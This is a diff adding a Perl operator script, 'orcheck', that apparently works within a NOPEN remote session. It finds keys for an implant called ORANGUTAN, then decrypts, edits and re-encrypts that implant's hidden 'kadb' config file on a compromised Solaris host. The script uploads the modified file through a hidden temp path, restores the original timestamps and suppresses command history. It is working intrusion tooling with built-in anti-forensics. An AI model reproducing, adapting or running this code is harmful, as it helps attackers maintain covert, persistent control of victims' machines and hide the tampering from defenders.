@@ -1,0 +1,282 @@
+#!/usr/bin/env perl
+#use File::Basename qw(basename dirname);
+use File::Basename ;
+##
+#TODO: use itime if available?
+$VER="1.8.2.3" ;
+myinit() ;
+# we -ls these in this order so the $upfile ls does not "access" the $updir atime
+($output,$nopenlines,@output) = doit("-ls -nd $updir $upfile");
+if ($output[1] =~ m,$upfile$, and
+    $output[0] =~ m,$updir$,) {
+  # Need these in reverse order
+  @touchlines = ($output[1],$output[0]);
+} elsif (!($calledviarequire)) {
+  mydie("Invalid format of previous -ls -nd line...cannot continue.\n".
+         "Is $KEYNAME even there?");
+} else {
+  progprint("${COLOR_NOTE}Invalid format of previous -ls -nd line...cannot continue.\n${COLOR_NORMAL}Is $KEYNAME even there?");
+  $skiprest=1;
+}
+
+doorcheck() unless $skiprest;
+
+sub doorcheck {
+doit("-get -q $upfile",@touchlines);
+@keyfiles = split(/\n/,`find $opbin/varkeys -type f 2>/dev/null | grep "/$nopen_hostonly.*_$nopen_ip\/.*$keyname"`);
+unless (@keyfiles) {
+  # None yet, maybe look by IP?
+  @keyfiles = split(/\n/,`find $opbin/varkeys -type f 2>/dev/null | grep _$nopen_ip\/.*$keyname`);
+}
+unless (@keyfiles) {
+  # None yet, maybe look by hostname? Could find too many so don't bother doing
+  # if we found one via the IP.
+  @keyfiles = split(/\n/,`find $opbin/varkeys -type f 2>/dev/null | grep "/$nopen_hostonly.*\/.*$keyname"`)
+    if $nopen_hostonly;
+}
+push(@keyfiles,"$opup/.keys") if (-e "$opup/.keys") ;
+unless ($overridekeystr) {
+  foreach $keyfile (@keyfiles) {
+    next unless (open(KEYIN,"< $keyfile")) ;
+    my $gotkey = 0 ;
+    $header = "" ;
+    while (<KEYIN>) {
+      if ($keyfile eq "$opup/.keys") {
+	$gotkey++ if (/$KEYNAME/) ;
+	next unless $gotkey;
+	$header .= $_ ;
+	next unless (/^([\da-f]+ [\da-f]+ [\da-f]+)/) ;
+	$keystr = $1 ;
+	last ;
+      } else {
+	$header .= $_ ;
+	next if /^\s*\#/ ;
+	next unless /$cvtag=\"([\da-f]+ [\da-f]+ [\da-f]+)\"/i ;
+	$keystr = $1 ;
+      }
+    }
+    close(KEYIN);
+    chomp($header) ;
+    $header{$keystr} .= $header ;
+    $keyfile{$keystr} .= "\nAND ALSO\n" if $keyfile{$keystr} ;
+    $keyfile{$keystr} .= $keyfile ;
+  }
+  progprint("++++++++++No $type keys found in ../bin/varkeys for $nopen_rhostname or $opup/.keys",$COLOR_FAILURE)
+    unless (keys %header) ;
+} else {
+  $header{$overridekeystr} = "\nkey manually input: $keystr\n";
+}
+my $justconfig = "-name $configfile" if ($editalso or $ignoreold) ;
+@configfiles = split(/\n/,`find $opdown/$nopen_rhostname -type f $justconfig 2>/dev/null | grep $configfile`);
+if (! @configfiles) {
+  mydie("++++++++++No $configfile files found in ../down/$nopen_rhostname");
+}
+my $outfirst = "" ;
+my $outlast = "" ;
+my $goodresult = "" ;
+my $mostrecentresult = "" ;
+foreach $configfile (@configfiles) {
+  my $configname = basename $configfile;
+  my $output = "" ;
+  my ($uniqsum) = (split(/\s+/,`sum $configfile`))[0] ;
+  # Skip this file if same content already done
+  next if ($doneit{$uniqsum}++) ;
+  my $mostrecent = !($configfile =~ /\d{3}$/) ;
+  foreach $keystr (keys %header) {
+    $result = `$encr -d -c $keystr -i $configfile |tee /tmp/$configname`;
+    chomp(my $asciitest = `file /tmp/$configname | grep -il ascii`) ;
+    unlink("/tmp/$configfile");
+    $output .= "+\n\n++++++++++KEYFILE:\n$keyfile{$keystr}:$COLOR_NOTE\n$header{$keystr}";
+    if ($result =~ /ERROR : not ascii/ or !$asciitest) {
+      $result = "" ;
+      $output .= "$COLOR_FAILURE\n++++++++++FAILS\a" ;
+      $colon = "";
+    } else {
+      $output .= "$COLOR_SUCCESS\n++++++++++WORKS" ;
+      $colon = ":";
+      print OUT2 "$keystr\n" if (open(OUT2,"> $opup/.keystr.$nopen_rhostname")) ;
+      close(OUT2);
+    }
+    $output .= "$COLOR_NORMAL on$COLOR_NOTE $configfile$colon\n\n$COLOR_NORMAL";
+    if ($result) {
+      $output .= "==========\n${result}==========\n$COLOR_NORMAL";
+      # $goodresult ends up the final .### one that works
+      $goodresult = $result ;
+      $mostrecentresult = $result if $mostrecent ;
+    }
+  }
+  if ($mostrecent) {
+    $outlast .= $output ;
+  } else {
+    $outfirst .= $output ;
+  }
+}#foreach $configfile
+if ($goodresult) {
+  if (open(OUT2,"> $opdown/$configfile.txt.$nopen_rhostname")) {
+    print OUT2 $goodresult ;
+    close(OUT2) ;
+    progprint($outfirst.
+	      $outlast.
+	      "${COLOR_FAILURE}\n\n".
+	      "Edit it using the popped up \"vi\" window, then save and exit.\n".
+	      "$COLOR_NORMAL")
+      if $editalso;
+  } else {
+    mydie("Unable to open > $opdown/$configfile.txt.$nopen_rhostname");
+  }
+}
+# We print and die unless we are also editing
+unless ($editalso) {
+  progprint($outfirst . $outlast) ;
+  return 1;
+}
+if (! -e "$opup/.keystr.$nopen_rhostname") {
+  mydie("Cannot proceed with edit--no valid key found during second pass of $prog");
+} elsif (open(KEYIN,"< $opup/.keystr.$nopen_rhostname")) {
+  chomp($keystr = <KEYIN>) ;
+  close(KEYIN) ;
+} else {
+  mydie("Cannot read key (which just worked) from $opup/.keystr.$nopen_rhostname");
+}
+chomp($presum = `sum $opdown/$configfile.txt.$nopen_rhostname`) ;
+system("xterm -geometry 142x27+335+0 -title \"$configfile.txt.$nopen_rhostname editor\" -e vi + $opdown/$configfile.txt.$nopen_rhostname") ;
+chomp($postsum = `sum $opdown/$configfile.txt.$nopen_rhostname`) ;
+if ($presum eq $postsum) {
+  progprint("${COLOR_NOTE}\nTo encrypt a modified $configfile.txt file as $opdown/$configfile.encr.$nopen_rhostname,\n".
+	    "use the following locally:\n\n".
+	    "$encr -e -c $keystr -i $opdown/$configfile.txt.$nopen_rhostname -o $opdown/$configfile.encr.$nopen_rhostname 2>&1\n");
+  mydie("Aborting edit -- $opdown/$configfile.txt.$nopen_rhostname was not changed.") ;
+}
+$printlater=
+  "${COLOR_NOTE}\nEncrypting just saved version as $opdown/$configfile.encr.$nopen_rhostname with:\n\n".
+  "$encr -e -c $keystr -i $opdown/$configfile.txt.$nopen_rhostname -o $opdown/$configfile.encr.$nopen_rhostname 2>&1\n".
+  `$encr -e -c $keystr -i $opdown/$configfile.txt.$nopen_rhostname -o $opdown/$configfile.encr.$nopen_rhostname 2>&1`.
+  `ls -al $opdown/$configfile.*.$nopen_rhostname | cut -c 1-9,34-999` ;
+$nohist = "-nohist ";
+
+$dowhat =
+  "$nohist\t-put $opdown/$configfile.encr.$nopen_rhostname ../../../../../tmp/.k\n\n".
+  "$nohist\tcat ../../../../../tmp/.k > $upfile\n".
+  "$nohist\t".$touchlines[0]."\n".
+  "$nohist\t".$touchlines[1]."\n".
+  "$nohist\t-rm ../../../../../tmp/.k\n\n" ;
+unless ($justdoit) {
+  progprint($printlater.
+	    "${COLOR_NORMAL}\n\n".
+	    "# Now upload it if you want (paste in all of the following lines):\n".
+	    "$COLOR_FAILURE\n".
+	    "$dowhat\n".
+	    "$nohist${COLOR_NORMAL}# And then you will need to reset $KEYNAME:\n".
+	    "$COLOR_FAILURE\n".
+	    "$nohist\tmount /\n"
+	   );
+} else {
+  progprint($printlater);
+  doit("-put $opdown/$configfile.encr.$nopen_rhostname ../../../../../tmp/.k",
+       "cat ../../../../../tmp/.k > $upfile",
+       @touchlines,
+       "-rm ../../../../../tmp/.k"
+      );
+}
+}
+# End with true value as we require this script elsewhere.
+1;
+#ENDMAIN
+
+sub myinit {
+  # If $willautoport is already defined, we must have been called
+  # by another script via require. We do not re-do autoport stuff.
+  $calledviarequire = 0;
+  $skiprest = 0;
+  if ($willautoport and $socket) {
+    progprint("$prog called -gs orcheck @ARGV");
+    $calledviarequire = 1;
+  } else {
+    $willautoport=1;
+    my $autoutils = "../etc/autoutils" ;
+    unless (-e $autoutils) {
+      $autoutils = "/current/etc/autoutils" ;
+    }
+    require $autoutils;
+    $progname = "orcheck";
+    $prog = "-gs $progname";
+  }
+  ## BEGIN differences between this and other similar
+  $keyname = "orangutan";
+  $KEYNAME = uc $keyname;
+  $type="OR";
+  $cvtag="CONFIG_KEYS";
+  $configfile="kadb";
+  @encrbin = ("encr.Linux","encr");
+  ## END differences between this and other similar
+  mydie("No user servicable parts inside.\n".
+	"(I.e., noclient calls $prog, not you.)\n".
+	"$vertext") unless $nopen_rhostname;
+  $usagetext="
+Usage: $prog [-h]                       (prints this usage statement)
+
+NOT CALLED DIRECTLY
+
+$prog is run from within a NOPEN session via when \"$prog\" is used.
+
+";
+  $gsusagetext="
+Usage: $prog [-i | [-e|edit [-D|justdoit] ] ]
+
+OPTIONS
+
+ -i    Ignore all $configfile.### files--only process \"$configfile\".
+
+$prog calls $opetc/auto$progname, which downloads the system's
+$configfile file and unpacks it locally if possible, showing its contents
+($configfile is the $type config file).
+
+In edit mode, it does the same and then pops up a vi window to edit the
+contents. Once you exit vi, the modified file is re-packed and you are
+provided with pastables to upload and re-read the new configuration.
+
+When editing, if the -D (or \"justdoit\") argument is given, then the
+modified file is re-packed and uploaded automatically after quitting vi.
+
+";
+  mydie("bad option(s)") if (! Getopts( "hveDi" ) ) ;
+  usage() if ($opt_h or $opt_v) ;
+  while (@ARGV) {
+    if ($ARGV[0] eq "edit" or $ARGV[0] eq "-e") {
+      $opt_e = 1 ;
+    }
+    if ($ARGV[0] eq "justdoit" or $ARGV[0] eq "-D") {
+      $opt_D = 1 ;
+    }
+    shift(@ARGV);
+  }
+  $editalso = "edit" if $opt_e ;
+  $justdoit = "justdoit" if $opt_D ;
+  $ignoreold = "-i" if $opt_i ;
+  my $chunks=0;
+  foreach (@ARGV) {
+    if (/^[\da-f]+$/i ) {
+      $keystr .= "$_ " ;
+      $chunks++;
+    }
+  }
+  chop($keystr);
+  $overridekeystr = $keystr ;
+  $overridekeystr = "" unless $chunks == 3 ;
+  # find the local encr binary
+  foreach $f (@encrbin) {
+    chomp($encr = `which $f 2>/dev/null`);
+    last if $encr;
+  }
+  mydie("Must have one of these in path: @encrbin") unless $encr;
+  mydie("This NOPEN client version ($nopen_clientver) is too old to use $prog")
+    if ((verval($nopen_clientver))[1] < (verval("3.0.3.0"))[1]);
+  $upfile = "/platform/SUNW,SystemEngine/$configfile";
+  if ($nopen_serverinfo =~ /i\S*86/i) {
+    $upfile = "/platform/dvri86pc/$configfile";
+  }
+  $updir = dirname $upfile ;
+  # If $socket is already defined, we must have been called
+  # by another script via require. We do not re-do autoport stuff.
+  $socket = pilotstart(quiet) unless $socket;
+}#myinit
